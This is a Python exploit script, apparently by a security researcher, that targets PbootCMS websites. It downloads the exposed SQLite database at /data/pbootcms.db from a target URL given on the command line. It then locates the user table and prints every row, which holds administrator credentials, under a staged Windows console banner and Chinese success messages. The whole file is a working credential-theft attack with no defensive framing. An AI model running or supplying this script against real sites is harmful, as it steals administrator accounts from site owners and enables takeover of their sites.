#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sqlite3
import sys
import time
import json
import re

urllib3.disable_warnings()

def get_user_pass():
    connection = sqlite3.connect("pbootcms.db")
    cursor = connection.cursor()
    try:
        cursor.execute("select name from sqlite_master where type='table';")
        result = cursor.fetchall()
        usertable = result[0][0]
        #print(result)
        for tablename in result:
            if re.search("user$", tablename[0]):
                usertable = tablename[0]
                break
        #print(usertable)
        cursor.execute("select * from "+usertable+";")
        return cursor.fetchall()
    except:
        print("Oops! Something wrong", sys.exc_info(), sql)
        return []


def verify(site):
    burp0_url = site + "/data/pbootcms.db"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False, timeout=20)
    if r.status_code == 200 and "SQLite" in r.text:
        with open("pbootcms.db", "wb") as code:
            code.write(r.content)
        return get_user_pass()
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 pbootcms-database-download.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取到的管理员账号信息为：", info)
    else:
        print("[-]漏洞不存在")

